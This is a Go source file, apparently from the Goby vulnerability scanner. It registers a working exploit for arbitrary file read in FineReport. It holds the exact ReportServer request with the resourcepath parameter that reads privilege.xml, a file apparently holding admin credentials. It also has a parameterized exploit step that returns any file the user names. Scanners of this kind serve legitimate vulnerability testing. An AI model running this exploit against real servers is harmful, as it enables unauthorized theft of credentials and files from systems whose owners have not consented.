package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "FineReport Arbitrary File Read",
    "Description": "FineReport Arbitrary file read",
    "Product": "FineReport",
    "Homepage": "https://www.finereport.com/",
    "DisclosureDate": "2021-06-09",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "app=\"Fanruan-FineReport\" || app=\"帆软-FineReport\"",
    "Level": "3",
    "Impact": "<p>FineReport Arbitrary file read</p>",
    "Recommendation": "<p>update lasted FineReport version </p>",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "Type": "input",
            "Value": "privilege.xml"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<PrivilegeManager",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<rootManagerName>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath={{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10209"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
